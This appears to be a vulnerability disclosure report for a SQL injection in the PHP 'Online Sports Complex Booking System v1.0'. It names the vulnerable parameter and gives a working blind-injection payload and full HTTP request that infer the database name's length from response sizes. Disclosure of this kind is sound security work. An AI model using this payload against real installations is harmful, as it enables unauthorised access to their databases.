# Online Sports Complex Booking System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15236/online-sports-complex-booking-system-phpmysql-free-source-code.html

Vulnerability File: /scbs/admin/categories/manage_category.php?id=

Vulnerability location: /scbs/admin/categories/manage_category.php?id=, id

Current database name: scbs_db,length is 7

[+] Payload: /scbs/admin/categories/manage_category.php?id=2%27%20and%20length(database())%20=7%20--+

```sql
GET /scbs/admin/categories/manage_category.php?id=2%27%20and%20length(database())%20=7%20--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=gp584rjk4ugbjakmto03cu7pco
Connection: close

// Leak place ---> id
```

When length (database ()) = 6, Content-Length: 2171
![image](https://user-images.githubusercontent.com/54017627/165215968-d74356b8-17cd-49db-b5a7-da9a4dc1ce2a.png)

![image](https://user-images.githubusercontent.com/54017627/165215488-15ee57dd-9c21-4fb8-b53f-120ca451348a.png)

When length (database ()) = 7, Content-Length: 2204
![image](https://user-images.githubusercontent.com/54017627/165215795-833afc4e-bc68-4e18-af5b-aa8be97b5e6d.png)

![image](https://user-images.githubusercontent.com/54017627/165215459-bd3a7cbe-eb4a-4fd4-80ce-1bb53ad55f66.png)

